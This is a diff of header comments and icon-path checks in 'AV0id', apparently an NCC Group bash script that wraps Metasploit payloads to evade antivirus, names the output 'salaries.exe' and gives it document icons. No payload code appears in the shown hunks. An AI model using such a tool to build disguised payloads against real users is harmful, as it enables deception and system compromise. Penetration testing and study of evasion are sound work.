@@ -1,27 +1,18 @@
 #!/usr/bin/env bash
-# AV0id - Metapsloit Payload Anti-Virus Avasion
-# Daniel Compton
+# AV0id - Metapsloit Payload Anti-Virus Avoider
+# Daniel Compton - NCCGroup
 # www.commonexploits.com
 # contact@commexploits.com
 # Twitter = @commonexploits
 # 05/2013
 # Tested on Bactrack 5 and Kali only.
-
-#####################################################################################
-# Released as open source by NCC Group Plc - http://www.nccgroup.com/
-
-# Developed by Daniel Compton, daniel dot compton at nccgroup dot com
-
-# https://github.com/nccgroup/metasploitavevasion
-
-#Released under AGPL see LICENSE for more information
-
-######################################################################################
+# Script updates can be found here, check you have the latest version: https://github.com/nccgroup/metasploitavevasion
 
 # Credit to other A.V scripts and research by Astr0baby, Vanish3r & Hasan aka inf0g33k
 
 # User options
 OUTPUTNAME="salaries.exe" # The payload exe created name
+
 
 # Script begins
 #===============================================================================
@@ -97,7 +88,7 @@ fi
 
 #Check for PDF icon files
 
-ls icons/icon.res >/dev/null 2>&1 && ls icons/autorun.ico >/dev/null 2>&1
+ls /icons/icon.res >/dev/null 2>&1 && ls /icons/autorun.ico >/dev/null 2>&1
 if [ $? -eq 0 ]
 	then
 		echo ""
@@ -271,7 +262,7 @@ echo '}' >> build.c
 
 # gcc compile the exploit
 
-ls icons/icon.res >/dev/null 2>&1
+ls icon.res >/dev/null 2>&1
 	if [ $? -eq 0 ]
 		then
 			i586-mingw32msvc-gcc -Wall -mwindows icons/icon.res build.c -o "$OUTPUTNAME"
